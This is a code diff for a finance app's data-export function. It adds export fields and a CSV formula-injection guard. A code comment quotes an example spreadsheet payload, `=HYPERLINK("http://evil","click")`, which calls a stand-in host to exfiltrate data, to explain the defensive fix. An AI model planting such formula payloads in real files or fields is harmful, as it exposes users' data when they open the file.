@@ -28,6 +28,7 @@ export async function exportData(format: ExportFormat = 'json'): Promise<void> {
       'to_account_id',
       'note',
       'date',
+      'recurring_id',
       'halal_status',
     ];
     const header = cols.join(',');
@@ -40,7 +41,13 @@ export async function exportData(format: ExportFormat = 'json'): Promise<void> {
     const accounts = raw.getAllSync(`SELECT * FROM accounts`);
     const budgets = raw.getAllSync(`SELECT * FROM budgets`);
     const recurring = raw.getAllSync(`SELECT * FROM recurring`);
-    payload = JSON.stringify({ transactions, accounts, budgets, recurring }, null, 2);
+    const paidItems = raw.getAllSync(`SELECT * FROM paid_items`);
+    const merchantMemory = raw.getAllSync(`SELECT * FROM merchant_memory`);
+    payload = JSON.stringify(
+      { transactions, accounts, budgets, recurring, paidItems, merchantMemory },
+      null,
+      2,
+    );
     ext = 'json';
     mime = 'application/json';
   }
@@ -54,8 +61,14 @@ export async function exportData(format: ExportFormat = 'json'): Promise<void> {
   }
 }
 
+// CSV escape with formula-injection guard. Cells starting with =, +, -, @,
+// tab, or CR are interpreted as formulas by Excel / Sheets / Numbers — a
+// crafted note like `=HYPERLINK("http://evil","click")` would exfiltrate
+// when the user opens the export. Prefix those cells with `'` so they're
+// rendered as literal text. CWE-1236.
 function csvEscape(v: unknown): string {
   if (v == null) return '';
-  const s = String(v).replace(/"/g, '""');
+  let s = String(v).replace(/"/g, '""');
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[",\n]/.test(s) ? `"${s}"` : s;
 }
